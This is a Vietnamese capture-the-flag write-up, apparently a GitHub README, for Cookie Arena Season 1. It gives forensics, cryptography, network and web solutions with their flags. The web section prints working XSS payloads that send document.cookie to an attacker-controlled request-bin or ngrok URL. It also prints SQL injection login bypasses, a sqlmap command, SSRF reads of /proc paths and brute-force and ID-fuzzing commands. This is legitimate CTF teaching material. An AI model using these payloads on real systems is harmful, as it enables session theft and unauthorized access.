# Cookie-Arena-Season-1
## Cre: psycholog1st

## Forensics

### AudiCaty
Tên đề bài và file đính kèm gợi ý chúng ta sử dụng Audacity. Mở audacity và tải open file wav đề cho. Sau đó chọn spectrogram view:
![image](https://user-images.githubusercontent.com/50044415/139641568-2c7841da-46d3-452a-9b44-dc425496d249.png)

Có thể vào spectrogram setting để chỉnh Max Frequency lên khoảng 20000Hz để dễ nhìn hơn
Flag: Flag{No_Bullets_for_Player_001}

### Basic Image
Link Facebook trong bài này là rabbit hole. Chỉ cần tải ảnh về rồi dùng strings và grep là có flag
![image](https://user-images.githubusercontent.com/50044415/139641921-54bd3340-288a-4fbd-8c75-8e3d195ae951.png)

Flag: Flag{metadataratatatataaaaaa}

###  ExSeller
Bản chất của file xlsx là file zip, vì vậy ta đổi đuôi file thành zip sau đó giải nén file. `mv bruteme.xlsx bruteme.zip; unzip bruteme.zi`
Tiếp theo ta grep flag là sẽ có flag
![image](https://user-images.githubusercontent.com/50044415/139642733-d34cc04b-df17-47d0-9113-a3a65dd3b9a6.png)

Flag: Flag{Micro$oft_Heck3r_Man}

###  From The Above 
File wav trong bài là sóng vô tuyến được gửi từ vệ tinh và có thể transform thành image với tool WxToImage. Link: https://www.wraase.de/wxtoimg/
Bài này mình dùng Windows để tải phần mềm này về rồi sau đó import file wav vào và chuyển qua tab Image thì ta đã có flag

### Streamer
Bài cho ta 1 file pcapng. Mở file với wireshark. Để ý răng có khá nhiều luồng traffic HTTP.
![image](https://user-images.githubusercontent.com/50044415/139642991-710ad17f-846a-4348-93b1-4748b3aec794.png)

Vì vậy ta vào File -> Export Objects -> HTTP -> Save all

Trong các file được export có 1 file zip có mật khẩu. Ta đọc một vài file php thì thấy 1 dòng có vẻ như là post data có chứa password `username=travisscott&password=truongvinhcuc&submit=Login`

Dùng mật khẩu để giải nén ta có flag.txt. 
Flag: Flag{TCP_streamin_go_skrrrrrrrt}

### Interceptor
Bài cho mình một file gif, lên mạng tìm các trang split gif online thì ta có 9 ảnh, mỗi ảnh chứa 1 mảnh QR code. Dùng photoshop cắt dán lại thì ta có: 

### Volatility
Bài này intended way chắc là dùng volatility mò từ từ, nhưng mà theo thói quen thì mình grep flag từ đầu luôn ai ngờ ra thật.
![image](https://user-images.githubusercontent.com/50044415/139643872-93e02bfc-8aa6-4682-93db-a5b677568ca2.png)


Flag: Flag{7ef31e58bd4086e294b4d700c721f35f}

### Github
Đề bài không cho link user github nên mình tự đoán là gaconlonton hoặc là cookiehanhoan. Vào github thì thấy có user cookiehanhoan thật, thấy có một repo duy nhất là HoangTuEch, vào soi commit thì thấy flag

![image](https://user-images.githubusercontent.com/50044415/139644123-74179a9c-840a-4b12-aefa-39afc13ffe33.png)

Ở phía trên có 1 commit fake flag để rick roll cơ mà mình không để ý nên k bị dính =))
Flag: Flag{no_where_to_hide_gitleaks}


## Cryptography
### XOR
### Morse
Lên google "Decode morse wav" thì thấy web này cho mình up file wav https://morsecode.world/international/decoder/audio-decoder-adaptive.html
Up luôn và cho nó chạy thì ra hidden message là MORSECODE
![image](https://user-images.githubusercontent.com/50044415/139644459-2779358d-113d-41c9-9c8c-dc63ad75ff22.png)

Flag: Flag{MORSECODE}

### Julius Caesar 
Vào decode.fr decode Ceasar cipher thì ta được Flag{El_Clasico_Cipher}

###  Sixty Four 
Vào CyberChef decode Base64 sau đó chuyển từ Hex về ascii thì ta có flag `Flag{___Base64xHex___}`

### Bruh AES

## Network
### Post Office Man
Dùng nc để kết nối với server Pop3 
`nc network.letspentest.org 9002`
Dựa theo gợi ý của bài thì ta đăng nhập vào server với lệnh USER và PASS
`USER psycho`
`PASS psycho`
Đăng nhập thành công, dùng lệnh `LIST` thì ta thấy có tổng cộng 10 message
![image](https://user-images.githubusercontent.com/50044415/139644923-3b45322a-4158-4769-89d3-95b0d7eeb416.png)

Đọc từng thư với lệnh `RETR`, tới message thứ 8 thì ta có flag

![image](https://user-images.githubusercontent.com/50044415/139645048-f3813dff-182b-410a-a12c-ebfe97ba2c17.png)
Flag: Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L}

### Very Good Shipper 
`nmap  network.letspentest.org`
Ta thấy có port 9002 mở, netcat tới và trả lời câu hỏi thì có flag

Flag: Flag{t00-ez-4-y0u}

### Where is my house?
Bài gợi ý dùng DNS, mình dùng lệnh `dig TXT  letspentest.org ` để query tất cả TXT records của domain này.

![image](https://user-images.githubusercontent.com/50044415/139645294-8414bc25-03b6-4168-a4b8-cdc67de5d6f1.png)

Flag: Flag{DNS_A_AAAA_TXT_CNAME}

### Scan me if you can 
Dùng nmap quét từ port 8100 - 9100
![image](https://user-images.githubusercontent.com/50044415/139645457-3d63d04a-087b-4e58-85f1-9fd380fd4e21.png)

Có port 9003 và 9004 mở, ta thử nc với port 9004 thì có flag
![image](https://user-images.githubusercontent.com/50044415/139645537-b828253d-18e0-462e-afc9-4f2f7f728608.png)

Flag: Flag{Every-Header-Have-It-Own-Meaning}

### Secure HTTP
Đề bài gợi ý sử dụng HTTPS ở port 9004, vào browser ta truy cập: https://network-insecure.letspentest.org:9004
Xem certificate của trang 
![image](https://user-images.githubusercontent.com/50044415/139645862-05e3d6a0-9728-4fd5-9c04-13cd29c046cf.png)

Flag: Flag{This-Is-A-Trusted-One}

## Web Exploitation
### XSS
Bài này bot có vấn đề nên mình mất khá nhiều thời gian tuy dễ. Payload: `<script>fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)</script>`

Flag: FLAG{10c802c9c6afc26769764b5b986d708a}

### XSS Filter
Có vẻ như bài này bị filter script nên mình dùng các payload sau: (vì bot có vấn đề nên mình không chắc payload nào hoạt động)
`<img src=1 onerror=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>`
`<img src=1 OnErrOr=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>`
`<img src=1 onload=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>`
`<img src=1 OnLOaD=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>`

Flag: FLAG{5b7eca261028a4042fde4e3f45dec294} xss filter

###  Ét Quy Eo 
SQL injection cơ bản
`username: 1' or true -- -`
`password: 1' or true -- -`

Sau đó ta nhận được chuỗi base64, decode thì ra flag
Flag: Flag{Fr33_Styl3}

###  SQL Filter 
Bài này đề filter dấu space, dấu ; và or.
Ta dùng payload sau: `root'/**/OR/**/true/**/--/**/`

Flag: Flag{Gr33t1nG}
P/s Bài này đề kiểm tra Referer Header nên nếu muốn dùng sqlmap có thể dùng command sau:
`sqlmap -u http://chal14.web.letspentest.org/system/ --batch -H "Referer: http://chal14.web.letspentest.org" --forms --crawl=2` còn ra hay không thì hên xui =))

### Misconfiguration 
Bài nói check file config. Mình lập tức nghĩ đến 2 file là .htaccess (Apache Server) và web.config (IIS Server)
Vào 2 file trên thì có 2 part của flag, tải file backup trong web.config thì có part cuối. Dùng lệnh `file dummy.bak` thì biết file này là file zip, unzip ta có part3.

Flag: Flag{1b283f0725d536a0f217d89caca7b183}

### Paparazzi
Hiển nhiên là 1 bài SSRF, ta có thể dùng file protocol để đọc file bất kỳ trên server, ngoài ra còn có thể dùng path đến directory như file:/// để có thể xem được list file của dir bất kỳ.

Ta thử file:/// thì thấy có 1 folder src khá là bất thường. Thử file:///src thì trả về invalid url, có vẻ như là bị block.
Process đang sử dụng của web server là process của flask, vì vậy khả năng cao là có thể truy cập được src thông qua /proc/self/cwd, tuy nhiên khả năng là self cũng bị block vì web trả về invalid url.

Đến đây mình quyết định fuzz thử pid, đầu tiên thử file:///proc để xem các pid hiện tại trong ps list
![image](https://user-images.githubusercontent.com/50044415/139650118-969cf337-c5ac-408b-8e83-9d32f04dcae0.png)

Sau đó fuzz các pid, đến pid 434 thì mình có: file:///proc/434/cwd

![image](https://user-images.githubusercontent.com/50044415/139650174-a1f7e0b5-342f-4fa7-bd1b-66d07ca58ecc.png)

Tiếp tục vào thư mục secret
![image](https://user-images.githubusercontent.com/50044415/139650260-18ed07c2-a6ea-46b2-9b95-51fda0149ec4.png)

Đọc flag: 
![image](https://user-images.githubusercontent.com/50044415/139650280-fe9edad5-ef51-43b8-9b51-2e8be96396ae.png)

### Gatling Gun
Bài này đã được cho list username, password và ip ở github của cookiehanhoan
Bắt request login bằng Burp Suite sau đó gửi qua tab Intruder, chọn Cluster Bomb Attack, clear các position sau đó ở mỗi position nhất định chọn các list tương ứng. Sau khi brute force thì ta có flag

Flag: FLAG{e6c068faf9241fe9d1f2000516718377}

###  The maze runner 
Download toàn bộ các folder về `wget http://chal10.web.letspentest.org/ -r`
Sau đó grep flag. Chấp mọi thể loại fake flag

![image](https://user-images.githubusercontent.com/50044415/139650673-208e50c5-1807-4607-9fc2-d5679752d260.png)

Flag: FLAG{6059e2117ea3eeecdad7faf1e15d16a2}

### ID'OR1=1
Bài này mới đầu mình tưởng SQLI nên tốn kha khá time, sau đó fuzz id thì ra 1337 là id có chứa flag
`wfuzz -w /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -u 'http://chal11.web.letspentest.org/user?id=FUZZ' --hh 24`

Flag: Flag{61cb4a784e83b6109999af6f036b88bf}




